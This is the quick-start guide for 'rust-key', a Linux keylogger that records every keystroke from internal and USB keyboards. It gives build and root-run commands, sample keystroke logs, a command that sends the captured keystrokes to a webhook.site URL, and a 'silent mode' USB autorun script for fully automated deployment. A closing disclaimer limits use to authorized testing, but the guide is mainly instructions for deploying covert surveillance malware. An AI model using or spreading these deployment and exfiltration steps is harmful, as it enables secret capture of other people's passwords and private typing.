# Quick Start Guide

Get started with rust-key in under 5 minutes!

## For Arch Linux Users (Primary Target)

### 1. Install Dependencies
```bash
sudo pacman -S rust cargo
```

### 2. Clone and Build
```bash
git clone https://github.com/LangerSword/rust-key.git
cd rust-key
cargo build --release
```

### 3. Run
```bash
sudo ./target/release/rust-key
```

That's it! The keylogger will start monitoring all keyboards (including USB).

### 4. View Logs
```bash
cat keylog.txt
# Or in real-time:
tail -f keylog.txt
```

### 5. Stop
Press `Ctrl+C` in the terminal where it's running.

---

## For Other Linux Distributions

### Ubuntu/Debian
```bash
# Install Rust
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
source $HOME/.cargo/env

# Install build tools
sudo apt-get update
sudo apt-get install build-essential pkg-config

# Clone and build
git clone https://github.com/LangerSword/rust-key.git
cd rust-key
cargo build --release

# Run
sudo ./target/release/rust-key
```

### Fedora/RHEL
```bash
# Install Rust
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
source $HOME/.cargo/env

# Install build tools
sudo dnf groupinstall "Development Tools"

# Clone and build
git clone https://github.com/LangerSword/rust-key.git
cd rust-key
cargo build --release

# Run
sudo ./target/release/rust-key
```

---

## Quick Tips

### Test Webhook Before Use
```bash
# Test your webhook URL first
./test_webhook.sh https://webhook.site/your-unique-id

# Then run with webhook
sudo ./target/release/rust-key https://webhook.site/your-unique-id
```

### Run without sudo (optional)
```bash
sudo usermod -a -G input $USER
# Log out and log back in, then:
./target/release/rust-key
```

### USB Deployment
```bash
# Interactive mode (with prompts)
./usb_autorun.sh

# Silent mode (fully automated)
sudo ./usb_autorun_silent.sh [WEBHOOK_URL]
```

### USB Keyboard Detection
- USB keyboards are automatically detected
- Look for "Type: USB Keyboard" in the output
- All keyboards are monitored simultaneously

### Default Locale
- Automatically set to en_US.UTF-8
- No configuration needed

---

## What You'll See

### On Startup
```
Rust Keylogger starting...
Default locale: en_US.UTF-8
Note: This tool is for educational/authorized security testing only.
Unauthorized use may be illegal.

Running on Linux with evdev support
Scanning for input devices (including USB keyboards)...

Found keyboard device:
  Name: AT Translated Set 2 keyboard
  Path: "/dev/input/event3"
  Physical: isa0060/serio0/input0
  Type: Internal/Other

Found keyboard device:
  Name: Logitech USB Keyboard
  Path: "/dev/input/event4"
  Physical: usb-0000:00:14.0-1/input0
  Type: USB Keyboard

Monitoring 2 keyboard device(s)...
```

### In Log File (keylog.txt)
```
=== Keylogger Started at 2024-01-01 12:00:00.000 ===
Locale: en_US.UTF-8
Monitoring device: AT Translated Set 2 keyboard (/dev/input/event3)
Monitoring device: Logitech USB Keyboard (/dev/input/event4)
[2024-01-01 12:00:05.123] [Logitech USB Keyboard] Key: h
[2024-01-01 12:00:05.234] [Logitech USB Keyboard] Key: e
[2024-01-01 12:00:05.345] [Logitech USB Keyboard] Key: l
[2024-01-01 12:00:05.456] [Logitech USB Keyboard] Key: l
[2024-01-01 12:00:05.567] [Logitech USB Keyboard] Key: o
```

---

## Troubleshooting

### "No input devices found!"
- **Solution**: Run with `sudo`
- Or add your user to the input group (see above)

### "Permission denied"
- **Solution**: You need sudo or input group membership
- Check: `ls -l /dev/input/event*`

### Not detecting USB keyboard
- **Solution**: Make sure the keyboard is plugged in before starting
- Restart the program after plugging in new keyboards

---

## ⚠️ Important Legal Notice

This tool is for:
- ✅ Security testing on systems you own
- ✅ Educational purposes with consent
- ✅ Authorized security research

This tool is NOT for:
- ❌ Monitoring others without consent
- ❌ Unauthorized access or surveillance
- ❌ Any illegal activity

Always obtain proper authorization and comply with local laws.

---

## Next Steps

For more detailed information, see:
- **QUICKREF.md** - Quick command reference for common tasks
- **README.md** - Full feature list and overview
- **INSTALL.md** - Detailed installation for all platforms
- **USAGE.md** - Advanced usage and examples
- **USB_SETUP.md** - USB deployment guide
- **TESTING.md** - Testing and verification procedures

## Support

- GitHub: https://github.com/LangerSword/rust-key
- Issues: https://github.com/LangerSword/rust-key/issues

---

**Current Version**: 0.1.0  
**Platform**: Linux (Arch, Ubuntu, Debian, Fedora, etc.)  
**Default Locale**: en_US.UTF-8  
**USB Support**: ✅ Yes  
**License**: MIT
